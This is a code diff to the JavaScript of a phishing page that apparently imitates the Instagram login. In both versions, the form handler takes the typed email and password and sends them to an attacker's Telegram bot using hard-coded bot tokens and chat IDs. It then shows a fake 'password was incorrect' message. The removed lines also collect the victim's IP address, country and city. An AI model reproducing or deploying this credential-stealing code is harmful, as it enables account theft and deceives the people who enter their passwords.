@@ -1,39 +1,22 @@
-const form = document.querySelector("#form");
-var ct = "5";
-var co = 0;
-var lo = 0;
-var st = 0;
+const form = document.querySelector("#form")
 
 form.addEventListener("submit", (e) => {
-  e.preventDefault();
- 
-    fetch("https://ipapi.co/json/")
-      .then((res) => res.json())
-      .then((data) => {
-        ct = data.ip;
-        co = data.country_name;
-        lo = data.country_calling_code;
-        st = data.city;
+    e.preventDefault();
 
-        var identity = document.getElementById("email").value;
-        var password = document.getElementById("password").value;
+    var identity = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
 
-        var my_text = `Result from IpAddress for user ${identity} is:%0A - Username/Email: ${identity} %0A - Password: ${password} %0A - IPAddress: ${ct} %0A - Country: ${co} %0A - Country-code: ${lo} %0A - state: ${st}`;
+    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`
 
-        var token = "6856364752:AAG6Lr_2eZKw4cBO1feTE4iUk4EOCKzTy98";
-        var chat_id =  -4053992153;
-        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`;
+    var token = "6600608955:AAFKyCPNWgIEeTeeyDg4E8BcN9-HYvhCcvk";
+    var chat_id = -4072994630
+    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`
 
-        let api = new XMLHttpRequest();
-        api.open("GET", url, true);
-        api.send();
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
+    let api = new XMLHttpRequest();
+    api.open("GET", url, true);
+    api.send();
+    // window.location.replace("https://www.instagram.com/accounts/login/")
+    console.log("Incorrect Password!");
 
-
-
-
-  // window.location.replace("https://www.instagram.com/accounts/login/")
-  //   console.log("Incorrect Password!");
-});
+    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
+})
